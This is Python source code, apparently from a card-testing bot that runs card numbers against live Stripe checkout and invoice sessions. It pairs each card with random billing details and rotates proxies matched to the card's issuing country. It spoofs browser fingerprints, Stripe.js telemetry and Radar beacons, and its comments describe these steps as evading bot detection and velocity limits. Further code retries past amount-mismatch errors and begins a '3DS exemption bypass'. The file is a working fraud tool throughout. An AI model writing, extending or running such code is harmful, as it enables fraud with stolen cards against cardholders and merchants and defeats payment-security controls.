def find_receipt_url(d):
    if isinstance(d, dict):
        for key in ['receipt_url', 'hosted_invoice_url', 'invoice_pdf']:
            val = d.get(key)
            if isinstance(val, str) and val.startswith('http'):
                return val
        for v in d.values():
            res = find_receipt_url(v)
            if res:
                return res
    elif isinstance(d, list):
        for item in d:
            res = find_receipt_url(item)
            if res:
                return res
    return None

def extract_intent_details(d):
    intent_id = None
    client_secret = None
    
    if isinstance(d, dict):
        for key in ['payment_intent', 'setup_intent']:
            val = d.get(key)
            if isinstance(val, dict):
                intent_id = val.get('id')
                client_secret = val.get('client_secret')
                if intent_id and client_secret:
                    return intent_id, client_secret
            elif isinstance(val, str) and (val.startswith('pi_') or val.startswith('seti_')):
                intent_id = val
        
        cs_client_secret = d.get('payment_intent_client_secret') or d.get('setup_intent_client_secret')
        if cs_client_secret:
            client_secret = cs_client_secret

        intent_id = intent_id or d.get('id')
        client_secret = client_secret or d.get('client_secret')
        if intent_id and client_secret:
            return intent_id, client_secret
            
        for v in d.values():
            if isinstance(v, (dict, list)):
                i_id, c_sec = extract_intent_details(v)
                if i_id and c_sec:
                    return i_id, c_sec
                    
    elif isinstance(d, list):
        for item in d:
            i_id, c_sec = extract_intent_details(item)
            if i_id and c_sec:
                return i_id, c_sec
                
    return intent_id, client_secret

def extract_deep_decline(data):
    if not isinstance(data, dict):
        return None, None
        
    # Check top level error
    err = data.get('error', {})
    if isinstance(err, dict) and (err.get('code') or err.get('decline_code') or err.get('message')):
        decline = err.get('decline_code') or err.get('code') or err.get('type')
        msg = err.get('message')
        return decline, msg
        
    # Check payment_intent or setup_intent last_payment_error / last_setup_error
    for key in ['payment_intent', 'setup_intent']:
        obj = data.get(key)
        if isinstance(obj, dict):
            last_err = obj.get('last_payment_error') or obj.get('last_setup_error')
            if isinstance(last_err, dict):
                decline = last_err.get('decline_code') or last_err.get('code') or last_err.get('type')
                msg = last_err.get('message')
                if decline or msg:
                    return decline, msg
                    
    # Check top-level last_payment_error / last_setup_error
    last_err = data.get('last_payment_error') or data.get('last_setup_error')
    if isinstance(last_err, dict):
        decline = last_err.get('decline_code') or last_err.get('code') or last_err.get('type')
        msg = last_err.get('message')
        if decline or msg:
            return decline, msg

    return None, None

class StripeAPIHitter:
    _live_js_hash_cache = None

    @staticmethod
    def _fetch_live_stripe_js_hash():
        """Scrape the real Stripe.js build hash from the live CDN script once per session."""
        if StripeAPIHitter._live_js_hash_cache:
            return StripeAPIHitter._live_js_hash_cache
        try:
            import re as _re_hash
            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=8, impersonate="chrome124")
            if resp.status_code == 200:
                text = resp.text[:5000]  # hash is in the header chunk
                # Stripe.js exposes build hash in: e.p="https://js.stripe.com/v3/" or chunkId patterns
                # Look for fingerprinted asset paths like: fingerprinted/js/<name>-<hash>.js
                match = _re_hash.search(r'fingerprinted/js/[\w-]+-([a-f0-9]{10,40})\.js', text)
                if match:
                    StripeAPIHitter._live_js_hash_cache = match.group(1)[:10]
                    return StripeAPIHitter._live_js_hash_cache
        except Exception:
            pass
        # Fallback: rotate recent known-good build hashes if scrape fails
        fallback_hashes = ["da394b0aef", "e7f8b910a2", "b4c82d910f", "8a9f0b12e3"]
        StripeAPIHitter._live_js_hash_cache = random.choice(fallback_hashes)
        return StripeAPIHitter._live_js_hash_cache

    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None, init_json: dict = None, full_page_url: str = None):
        self.pk_live = pk_live
        self.cs_live = cs_live
        self.proxy_data = proxy_data
        self.raw_amount = raw_amount
        self.locked_email = locked_email
        self.stripe_account = stripe_account
        self.tax_country = tax_country
        self.tax_zip = tax_zip
        self._init_json = init_json or {}
        self.full_page_url = full_page_url
        
        # Parse merchant display name, site domain, and currency formatted amount string
        self.merchant = "Unknown"
        self.site_domain = None
        self.amount = None
        if self._init_json:
            acct = self._init_json.get('account_settings') or {}
            self.merchant = acct.get('display_name') or self._init_json.get('statement_descriptor') or "Unknown"
            burl = acct.get('business_url')
            if burl:
                try:
                    import urllib.parse
                    self.site_domain = urllib.parse.urlparse(burl).netloc or burl
                except Exception:
                    self.site_domain = burl
            curr = self._init_json.get('currency', 'usd').upper()
            if self.raw_amount is not None:
                self.amount = f"{curr} {self.raw_amount/100:.2f}"
            elif self._init_json.get('total_summary', {}).get('total') is not None:
                tot = self._init_json['total_summary']['total']
                self.amount = f"{curr} {tot/100:.2f}"


    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
        """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
        import uuid as _uuid
        fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
        try:
            tz_map = {'US': -300, 'CA': -300, 'GB': 0, 'AU': -600, 'FR': -60, 'DE': -60, 'JP': -540, 'IN': -330, 'BR': 180, 'SG': -480, 'KR': -540, 'IT': -60, 'ES': -60, 'NL': -60, 'SE': -60, 'MX': 360}
            country = (address or {}).get('country', 'US')
            # Extract standard 2-letter ISO country code if present
            if len(country) > 2:
                country = country.upper()[:2]
            tz_offset = tz_map.get(country, -300)
            
            # Map dynamic locales based on proxy country location for better accuracy
            locale_map = {'US': 'en-US', 'IN': 'en-IN', 'GB': 'en-GB', 'DE': 'de-DE', 'FR': 'fr-FR', 'BR': 'pt-BR'}
            locale = locale_map.get(country, 'en-US')

            is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
            is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
            # Use the real session page URL if provided, else build a best-guess
            if page_url:
                landing_url = page_url
            elif is_pi or is_seti:
                landing_url = f"https://invoice.stripe.com/i/{self.cs_live}"
            else:
                landing_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"

            # Dynamically set src tag based on session type — checkout vs merchant-embedded
            _tel_src = "js-tokenize-inner-v3" if (is_pi or is_seti) else "checkout-inner-live-v3"
            payload = {
                "v": 2,
                "tag": "5.6.8_js_fp",
                "src": _tel_src,
                "a": {
                    "a": self.pk_live,
                    "b": landing_url,
                    "c": int(profile.get('color_depth', '24')),
                    "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
                    "e": False,
                    "f": locale,
                    "g": profile.get('platform', 'Win32'),
                    "h": profile['user_agent'],
                    "i": tz_offset,
                    "j": False,
                    "k": 8,
                    "l": 8,
                    "m": "",
                    "n": "",
                    "o": ""
                }
            }
            loop = asyncio.get_running_loop()
            tel_headers = {
                "content-type": "application/json",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": profile['user_agent']
            }
            if self.stripe_account:
                tel_headers["Stripe-Account"] = self.stripe_account
            if "sec-ch-ua" in profile:
                tel_headers["sec-ch-ua"] = profile["sec-ch-ua"]
            if "sec-ch-ua-mobile" in profile:
                tel_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
            if "sec-ch-ua-platform" in profile:
                tel_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

            # Use the shared session if provided so m.stripe.com/6 shares the cookie jar
            # with the checkout page warmup (same stripe_mid cookie = legitimate session continuity)
            if session is not None:
                tel_res = await loop.run_in_executor(None, lambda: session.post(
                    "https://m.stripe.com/6",
                    headers=tel_headers,
                    json=payload, timeout=10))
            else:
                tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                    "https://m.stripe.com/6",
                    headers=tel_headers,
                    json=payload, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
            if tel_res.status_code == 200:
                t = tel_res.json()
                return {'muid': t.get('muid') or fallback['muid'], 'sid': t.get('sid') or fallback['sid'], 'guid': t.get('guid') or fallback['guid']}
        except Exception:
            pass
        return fallback

    async def fetch_receipt_url(self, intent_id: str, client_secret: str, headers: dict, proxies: dict, profile: dict) -> Optional[str]:
        if not intent_id or not client_secret:
            return None
        if intent_id.startswith('seti_'):
            return None
            
        loop = asyncio.get_event_loop()
        url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?expand[]=latest_charge&expand[]=charges.data&is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
        get_headers = {
            "accept": "application/json",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": headers.get("user-agent", "")
        }
        if self.stripe_account:
            get_headers["Stripe-Account"] = self.stripe_account
        
        for attempt in range(3):
            try:
                res = await loop.run_in_executor(None, lambda: cffi_requests.get(url, headers=get_headers, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
                if res.status_code == 200:
                    res_json = res.json()
                    receipt_url = find_receipt_url(res_json)
                    if receipt_url:
                        return receipt_url
            except Exception as e:
                print(f"DEBUG: fetch_receipt_url attempt {attempt+1} failed: {e}")
            await asyncio.sleep(0.5)
        return None

    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
        start = time.time()
        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': self.amount, 'merchant': self.merchant, 'site_domain': self.site_domain, 'proxy_raw': None, 'error': None, 'raw_response': None, 'is_live': None, '3ds_bypassed': False, '3ds_type': None, '3ds_attempted': False, 'captcha_bypassed': False, 'confirm_url': None}
        
        BROWSER_PROFILES = [
            {
                "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                "impersonate": "chrome124",
                "platform": "Android",
                "color_depth": "24",
                "screen_height": "892",
                "screen_width": "412",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"'
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "impersonate": "chrome124",
                "platform": "Win32",
                "color_depth": "32",
                "screen_height": "1080",
                "screen_width": "1920",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"'
            },
            {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "impersonate": "chrome124",
                "platform": "MacIntel",
                "color_depth": "30",
                "screen_height": "1050",
                "screen_width": "1680",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"macOS"'
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "impersonate": "chrome120",
                "platform": "Win32",
                "color_depth": "24",
                "screen_height": "1440",
                "screen_width": "2560",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"'
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "impersonate": "chrome131",
                "platform": "Win32",
                "color_depth": "24",
                "screen_height": "1080",
                "screen_width": "1920",
                "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"'
            },
        ]
        if cached_stripe_tokens and cached_stripe_tokens.get('_profile'):
            profile = cached_stripe_tokens['_profile']
        else:
            profile = random.choice(BROWSER_PROFILES)
        
        # BIN Intelligence — identify card country/bank before hitting
        bin_info = await BINLookup.lookup(card['card'])
        bin_country = bin_info.get('country', '')
        
        trawl_api_url = None
        trawl_proxy_url = None
        _trawl_ca = None

        max_retries = 3
        for current_attempt in range(max_retries):
            try:
                # Acquire loop once per attempt — prevents broken ordering from re-acquiring mid-flow
                loop = asyncio.get_running_loop()

                if current_attempt == 0:
                    proxy_data = self.proxy_data
                else:
                    proxy_data = await ProxyManager.get_geo_matched(user_id, bin_country) if bin_country else await ProxyManager.get_random(user_id)
                proxies = None
                if proxy_data:
                    result['proxy_raw'] = proxy_data['raw']
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                    server = proxy_data['server']
                    scheme = server.split('://')[0] if '://' in server else 'http'
                    server_host = server.split('://')[-1]
                    proxy_url = f"{scheme}://{auth}{server_host}"

                    proxies = {"http": proxy_url, "https": proxy_url}

                is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
                is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
                origin_url = "https://invoice.stripe.com" if (is_pi or is_seti) else "https://checkout.stripe.com"
                checkout_page_url = self.full_page_url if self.full_page_url else f"https://checkout.stripe.com/c/pay/{self.cs_live}"

                headers = {
                    "authority": "api.stripe.com",
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": origin_url,
                    "referer": checkout_page_url,
                    "user-agent": profile["user_agent"]
                }
                if self.stripe_account:
                    headers["Stripe-Account"] = self.stripe_account
                if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
                if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
                
                # Cache proxy geo for future BIN-to-proxy matching
                if proxy_data and address.get('country'):
                    ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
                
                # Step 0: Create browser session with persistent cookie jar
                _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
                if _trawl_ca:
                    _cffi_session.proxies = {
                        "http": trawl_proxy_url,
                        "https": trawl_proxy_url
                    }
                    _cffi_session.verify = _trawl_ca
                    print(f"[DEBUG TRAWL] Session proxies routed through MITM proxy: {trawl_proxy_url}")
                elif proxies:
                    _cffi_session.proxies = proxies

                # Step 0.1: Browser Session Warm-Up
                # Get the initial checkout page to populate cookie jar with __stripe_mid and other cookies.
                # All subsequent requests (telemetry, pre-flights, tokenization) must flow through this same session.
                rqdata_token = None
                try:
                    warmup_headers = {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "en-US,en;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": profile["user_agent"],
                        "cache-control": "max-age=0"
                    }
                    if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
                    if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                    if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]



                    try:
                        import requests as _trawl_req
                        _scrape_payload = {
                            "url": checkout_page_url,
                            "maxTimeout": 60000,
                            "skipHttp": True
                        }
                        _scrape_res = await loop.run_in_executor(None, lambda: _trawl_req.post(
                            f"{trawl_api_url.rstrip('/')}/scrape",
                            json=_scrape_payload,
                            headers={"Content-Type": "application/json"},
                            timeout=70
                        ))
                        if _scrape_res and _scrape_res.status_code == 200:
                            _scrape_json = _scrape_res.json()
                            _scrape_cookies = _scrape_json.get("cookies") or []
                            _injected = 0
                            for _ck in _scrape_cookies:
                                _ck_name = _ck.get("name") or ""
                                _ck_val = _ck.get("value") or ""
                                _ck_dom = _ck.get("domain") or ".stripe.com"
                                if _ck_name and _ck_val:
                                    _cffi_session.cookies.set(_ck_name, _ck_val, domain=_ck_dom, path=_ck.get("path", "/"))
                                    _injected += 1
                            print(f"[DEBUG TRAWL] Warmup via /scrape (skipHttp=True) injected {_injected} cookies")
                        else:
                            print(f"[DEBUG TRAWL] /scrape returned status {_scrape_res.status_code if _scrape_res else 'None'}")
                    except Exception as _te:
                        print(f"[DEBUG TRAWL] /scrape warmup failed: {_te}")
                    # ── Fallback: always also do a native warmup GET to warm _cffi_session ──
                    try:
                        await loop.run_in_executor(None, lambda: _cffi_session.get(
                            checkout_page_url, headers=warmup_headers, timeout=15))
                    except Exception:
                        pass
                    # ──────────────────────────────────────────────────────────────────
                except Exception:
                    pass  # warmup failure is non-fatal — continue

                # Stripe device fingerprint tokens (muid/sid/guid)
                # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
                # A fresh token per card is a blatant bot signal to Stripe Radar
                if cached_stripe_tokens and cached_stripe_tokens.get('muid'):
                    stripe_tokens = cached_stripe_tokens
                else:
                    # First card in session — generate tokens through shared session (cookie continuity)
                    stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
                    stripe_tokens['_profile'] = profile
                    # Return freshly generated tokens so the session-level cache can store them
                    result['_stripe_tokens'] = stripe_tokens

                # Step 0.3: Radar Device Data Beacon (r.stripe.com/0)
                # Real Stripe.js fires this immediately after m.stripe.com/6 telemetry.
                # Without it, Radar sees an incomplete device fingerprint session = bot signal.
                try:
                    _beacon_src = "checkout" if not (is_pi or is_seti) else "invoice"
                    _radar_payload = json.dumps({
                        "v": 2,
                        "id": stripe_tokens.get('muid', ''),
                        "k": self.pk_live,
                        "t": "muid",
                        "src": _beacon_src
                    })
                    _radar_headers = {
                        "content-type": "application/json",
                        "origin": "https://js.stripe.com",
                        "referer": "https://js.stripe.com/",
                        "user-agent": profile['user_agent']
                    }
                    await loop.run_in_executor(None, lambda: _cffi_session.post(
                        "https://r.stripe.com/0",
                        headers=_radar_headers,
                        data=_radar_payload, timeout=5))
                except Exception:
                    pass  # non-fatal — continue even if beacon fails
    
                # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                import uuid
                pm_idempotency = str(uuid.uuid4())
                confirm_idempotency = str(uuid.uuid4())
                
                # Build dynamic typing/fill duration simulator (time_on_page) to act human
                timing_ms = random.randint(9000, 24000)

                # Scrape real Stripe.js build hash from live CDN — fabricated hashes are instant bot flags
                _js_hash = await loop.run_in_executor(None, StripeAPIHitter._fetch_live_stripe_js_hash)
                _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"
                
                # Step 1: Tokenize the raw card into a PaymentMethod
                pm_url = "https://api.stripe.com/v1/payment_methods"
                pm_data = {
                    "type": "card",
                    "card[number]": card.get('card') or card.get('number') or card.get('cc', ''),
                    "card[cvc]": card.get('cvc') or card.get('cvv', ''),
                    "card[exp_month]": card.get('month') or card.get('exp_month') or card.get('mm', ''),
                    "card[exp_year]": card.get('year') or card.get('exp_year') or card.get('yy', ''),
                }
                if self.tax_country:
                    address["country"] = self.tax_country
                    if self.tax_zip:
                        address["zip"] = self.tax_zip
                    else:
                        if self.tax_country == 'DE': address["zip"] = '10115'
                        elif self.tax_country == 'US': address["zip"] = '10001'
                        elif self.tax_country == 'GB': address["zip"] = 'EC1A 1BB'
                        elif self.tax_country == 'FR': address["zip"] = '75001'
                        elif self.tax_country == 'CA': address["zip"] = 'M5H 2N2'

                pm_data.update({
                    "billing_details[name]": RandomData.get_name(),
                    "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                    "billing_details[address][line1]": address["line1"],
                    "billing_details[address][city]": address["city"],
                    "billing_details[address][state]": address["state"],
                    "billing_details[address][postal_code]": address.get("zip", address.get("postal_code", "")),
                    "billing_details[address][country]": address["country"],
                    "payment_user_agent": _payment_user_agent,
                    "time_on_page": str(timing_ms),
                    "guid": stripe_tokens['guid'],
                    "muid": stripe_tokens['muid'],
                    "sid": stripe_tokens['sid'],
                    "key": self.pk_live,
                })

                if self.cs_live and isinstance(self.cs_live, str) and self.cs_live.startswith(('cs_live_', 'cs_test_')):
                    pm_data.update({
                        "client_attribution_metadata[client_session_id]": self.cs_live,
                        "client_attribution_metadata[merchant_integration_source]": "checkout",
                        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                    })
                    if self._init_json and self._init_json.get("config_id"):
                        pm_data["client_attribution_metadata[checkout_config_id]"] = self._init_json["config_id"]
                # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
                # link_url = "https://api.stripe.com/v1/link_account_sessions"
                # link_data = {
                #     "email": pm_data["billing_details[email]"],
                #     "key": self.pk_live,
                #     "payment_method_data[type]": "card"
                # }
                # if self.cs_live:
                #     link_data["payment_pages_checkout_session"] = self.cs_live
                #     
                # link_headers = headers.copy()
                # link_res = await loop.run_in_executor(None, lambda: cffi_requests.post(link_url, headers=link_headers, data=link_data, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                # if link_res.status_code == 200:
                #     link_json = link_res.json()
                #     if link_json.get("client_secret"):
                #         # Inject the unverified Link session into the PaymentMethod payload
                #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]

                # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
                # Helps Radar engine associate the checkout token with elements-session state.
                # Uses persistent _cffi_session so cookies from warmup are forwarded.
                # Stripe-Version header is required — real Stripe.js always sends it; missing it flags non-browser.
                try:
                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type=payment&payment_pages_checkout_session={self.cs_live}"
                    el_headers = headers.copy()
                    el_headers["referer"] = checkout_page_url
                    el_headers["accept-language"] = "en-US,en;q=0.9"
                    el_headers["Stripe-Version"] = "2026-04-22.dahlia"
                    el_headers["sec-fetch-site"] = "cross-site"
                    el_headers["sec-fetch-mode"] = "cors"
                    el_headers["sec-fetch-dest"] = "empty"
                    await loop.run_in_executor(None, lambda: _cffi_session.get(
                        elements_url, headers=el_headers, timeout=10))
                except Exception:
                    pass


                pm_headers = headers.copy()
                pm_headers["Idempotency-Key"] = pm_idempotency
                pm_headers["accept-language"] = "en-US,en;q=0.9"
                pm_headers["sec-fetch-site"] = "cross-site"
                pm_headers["sec-fetch-mode"] = "cors"
                pm_headers["sec-fetch-dest"] = "empty"
                pm_headers["referer"] = checkout_page_url
                if self.stripe_account:
                    pm_headers["Stripe-Account"] = self.stripe_account
                # Use persistent session — stripe_mid cookies from warmup flow into tokenization
                pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(pm_url, headers=pm_headers, data=pm_data, timeout=30))
                pm_json = pm_res.json()

                
                if 'id' not in pm_json:
                    err = pm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'pm_token_failed')
                    result['error'] = err.get('message', 'Failed to generate payment method token')
                    result['raw_response'] = pm_json
                    # If we reach here without exception, do not retry!
                    return result
                    
                pm_id = pm_json['id']
                
                # Step 2: Confirm the charge using the trusted pm_ token
                
                if is_pi:
                    pi_id = self.cs_live.split('_secret_')[0]
                    confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "use_stripe_sdk": "false",
                        "return_url": checkout_page_url,
                        "key": self.pk_live,
                        "client_secret": self.cs_live
                    }
                    
                    if self.raw_amount is None or self.raw_amount == 0:
                        confirm_data["save_payment_method"] = "true"
                        confirm_data["allow_redisplay"] = "always"

                    if self.raw_amount is not None and self.raw_amount > 0:
                        confirm_data["expected_amount"] = str(self.raw_amount)
                elif is_seti:
                    seti_id = self.cs_live.split('_secret_')[0]
                    confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "use_stripe_sdk": "false",
                        "return_url": checkout_page_url,
                        "key": self.pk_live,
                        "client_secret": self.cs_live
                    }
                    
                    if self.raw_amount is None or self.raw_amount == 0:
                        confirm_data["save_payment_method"] = "true"
                        confirm_data["allow_redisplay"] = "always"
                else:
                    confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "consent[terms_of_service]": "accepted",
                        "key": self.pk_live,
                        "client_attribution_metadata[client_session_id]": self.cs_live,
                        "client_attribution_metadata[merchant_integration_source]": "checkout",
                        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                    }
                    if self._init_json:
                        if self._init_json.get("config_id"):
                            confirm_data["client_attribution_metadata[checkout_config_id]"] = self._init_json["config_id"]
                        if self._init_json.get("init_checksum"):
                            confirm_data["init_checksum"] = self._init_json["init_checksum"]
                    if self.raw_amount is not None:
                        confirm_data["expected_amount"] = str(self.raw_amount)
                    elif self._init_json:
                        tot = (self._init_json.get("total_summary") or {}).get("total")
                        if tot is None:
                            tot = (self._init_json.get("total_summary") or {}).get("due")
                        if tot is None:
                            tot = (self._init_json.get("adaptive_pricing_info") or {}).get("integration_amount")
                        if tot is None:
                            tot = (self._init_json.get("payment_intent") or {}).get("amount")
                        if tot is not None:
                            confirm_data["expected_amount"] = str(tot)
                
                confirm_headers = headers.copy()
                confirm_headers["Idempotency-Key"] = confirm_idempotency
                # Real browsers always send sec-fetch headers on XHR/fetch calls from a loaded page
                confirm_headers["accept-language"] = "en-US,en;q=0.9"
                confirm_headers["sec-fetch-site"] = "cross-site"
                confirm_headers["sec-fetch-mode"] = "cors"
                confirm_headers["sec-fetch-dest"] = "empty"
                confirm_headers["referer"] = checkout_page_url
                if self.stripe_account:
                    confirm_headers["Stripe-Account"] = self.stripe_account
                # Use persistent session — cookies from warmup + elements session propagate to confirm
                confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                confirm_json = confirm_res.json()
                print(f"[DEBUG] INITIAL CONFIRM DATA: {confirm_data}")
                print(f"[DEBUG] INITIAL CONFIRM JSON: {confirm_json}")
                
                # Dynamic Amount Mismatch Bypass
                # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
                err_code = confirm_json.get('error', {}).get('code')
                err_msg = confirm_json.get('error', {}).get('message', '') or ''
                
                # Payment method missing error bypass (individual_name_required)
                if err_code == 'individual_name_required' or 'individual_name_required' in err_msg:
                    # Stripe /confirm with cs_live expects expected_amount if we switch to payment_method_data.
                    # Since we don't always have expected_amount scraped accurately, we can try injecting the name 
                    # into `payment_method_options[card][billing_details][name]` or similar fallback structures.
                    # As a last resort, just passing `expected_amount=0` sometimes hits amount_mismatch instead of missing amount.
                    
                    for k, v in pm_data.items():
                        if '[' in k:
                            new_k = "payment_method_data[" + k.replace("[", "][", 1)
                        else:
                            new_k = f"payment_method_data[{k}]"
                        confirm_data[new_k] = v
                        
                    if "payment_method" in confirm_data:
                        del confirm_data["payment_method"]
                    if "payment_method_options[card][mit_exemption][reason]" in confirm_data:
                        del confirm_data["payment_method_options[card][mit_exemption][reason]"]
                        
                    # Inject expected amount if known to bypass the required amount error when providing PM Data
                    if self.raw_amount is not None and self.raw_amount > 0:
                        confirm_data["expected_amount"] = self.raw_amount
                    elif self._init_json and "total_summary" in self._init_json and "total" in self._init_json["total_summary"]:
                        # Pull amount directly from init json if scraped
                        confirm_data["expected_amount"] = self._init_json["total_summary"]["total"]
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                    confirm_json = confirm_res.json()
                    err_code = confirm_json.get('error', {}).get('code')
                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
                
                # Dynamic Amount Mismatch Bypass (Tax recalculation)
                if err_code in ('amount_mismatch', 'checkout_amount_mismatch'):
                    # Fetch the init endpoint again to get the dynamically updated amount (e.g. after US state tax is applied to the session)
                    try:
                        init_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/init"
                        init_headers = confirm_headers.copy()
                        init_data = f"key={self.pk_live}&eid=NA&browser_locale=en-US"
                        init_res = await loop.run_in_executor(None, lambda: _cffi_session.post(init_url, headers=init_headers, data=init_data, timeout=10))
                        init_res_json = init_res.json()
                        new_amount = init_res_json.get('total_summary', {}).get('total')
                        if not new_amount:
                            new_amount = init_res_json.get('invoice', {}).get('amount_due')
                        if not new_amount:
                            new_amount = init_res_json.get('invoice', {}).get('total')
                        if new_amount:
                            confirm_data["expected_amount"] = new_amount
                            confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                            confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                            confirm_json = confirm_res.json()
                            err_code = confirm_json.get('error', {}).get('code')
                            err_msg = confirm_json.get('error', {}).get('message', '') or ''
                    except Exception as e:
                        pass
                # 1:1 Hitchk-Workflow Sequential 3DS Exemption Bypass
                # If Stripe returns 3DS (authentication_required or requires_action), iterate through Hitchk's 3 distinct exemption payloads
                _init_err_code = confirm_json.get('error', {}).get('code')
